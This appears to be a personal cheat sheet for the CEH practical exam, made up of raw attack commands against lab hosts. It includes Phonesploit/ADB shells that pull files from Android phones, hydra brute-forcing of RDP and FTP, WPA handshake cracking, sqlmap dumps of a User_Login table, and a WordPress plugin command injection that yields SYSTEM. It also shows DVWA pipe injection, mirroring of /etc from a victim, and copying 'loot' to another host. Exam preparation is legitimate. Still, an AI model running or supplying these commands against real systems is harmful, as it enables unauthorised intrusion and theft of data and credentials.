# CEH

mysql
nmap -p 3306 10.10.1.0/24
nmap -sV -p 0-65535 10.10.1.19


Product Version/FQDN/DNS CN
nmap -p 389 10.10.1.0/24
nmap -A 10.10.1.22

Android
nmap -p 5555 10.10.1.0/24
Phonesploit 10.10.1.14
Get shell
Navigate /sdcard/Downloads
ls
pull /sdcard/Downloads
open image file

RDP (remmina)
nmap -p 3389 10.10.1.0/24
Remote Desktop Connection
Windows Explorer Search

Cryptoforge
HashCalc

snow
cyberchef base64 encode  
open cmd in snow folder
snow -C -m "base64 encoded output" -p "password" restricted.txt restricted2.txt
snow -C -p "password" restricted2.txt
cyberchef base64 decode

log4j-shell-poc
nmap -p 22 10.10.1.0/24
ssh ubuntu@10.10.1.9
toor
find log4j-shell-poc folder
cat requirements.txt

OpenVAS
docker run -d -p 443:443 –-name openvas mikesplain/openvas
127.0.0.1

WordPress
https://wpscan.com/  (hackscuseme@proton.me - Phan)
wpscan --url http://10.10.1.22:8080/CEH --api-token [API Token 
curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL' 
nt authority\ \system

RDP (remmina)
nmap -p  21, 139, 3389 10.10.1.0/24
hydra -L Usernames.txt -P Passwords.txt 10.10.1.11 rdp
RDP 10.10.1.11
Search for CEH-Tools

Map Windows drive in ParrotOS
smbclient \\\\10.10.1.11\\CEH-Tools -U username

IPV4 packet counts
Wireshark -> Statistics -> Conversations -> IPv4 -> Sort by Packets

aircrack-ng -w password.txt W!F!_Pcap.cap


SQLmap
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step#8]" --dbs 


DVWA
Login to http://10.10.1.22:8080/DVWA
admin / password
Set Security to low
| dir directory
| type file name

Linux privilege escalation
nmap -p 22 10.10.1.0/24
ssh ubuntu@10.10.1.9
toor
cd /
cat

ELF & DIE
Detect It Easy
load file
Hash button
PT_LOAD(0)


SQL Injection
Parrot Firefox login to website
Developer tools copy cookie
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" --dbs
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" -D moviescope --tables
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value ]" -D moviescope -T User_Login --dump


https://crackstation.net

https://gchq.github.io/CyberChef/

nmap.org/download.html

hostname -I

Domain Controller 389
Windows web dev env 3306
RDP RAT 3389
Android ADB 5555

sqlmap -u "http://www.moviescope.com" --crawl=2 --dump-format=CSV --dump

sqlmap -u "http://www.moviescope.com" --crawl=2
# accept defaults

ls ~/.local/share/sqlmap/output/www.moviescope.com/
cat ~/.local/share/sqlmap/output/www.moviescope.com/*.csv

nmap -p 20,21,22,139,445,3389 <target>

get remote_file local_file
mget -R remotefolder/*
wget -m ftp://user:pass@host/remotefolder/

On ParrotOS, lftp is installed or available via apt install lftp. It supports recursive downloads:

lftp ftp://user:pass@victim-ip
mirror /etc configs_backup

aircrack-ng handshake.cap -w rockyou.txt

# ADB equivalent:
adb -s 192.168.1.50:5555 pull /sdcard/DCIM/Camera ./loot/192.168.1.50/Camera

On Windows 11, enable OpenSSH Server (Settings → Optional Features → Add a feature)

scp -r ./loot/192.168.1.50/Camera YourWinUser@192.168.1.20:/Users/YourWinUser/Desktop/loot/

sudo apt install -y cifs-utils
sudo mkdir -p /mnt/winshare
sudo mount -t cifs //192.168.1.20/dropbox /mnt/winshare -o username=YourWinUser,domain=WORKGROUP
cp -r ./loot/192.168.1.50/Camera /mnt/winshare/
sudo umount /mnt/winshare

cd ./loot/192.168.1.50
python3 -m http.server 8000
On Windows, open a browser to http://<ParrotOS-IP>:8000/ and download the folder/files.

hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 11]. 

hydra -l Administrator -P passwords.txt rdp://10.10.1.11 -t 4 -f -V

docker run -d -p 443:443 –-name openvas mikesplain/openvas command to launch OpenVAS.
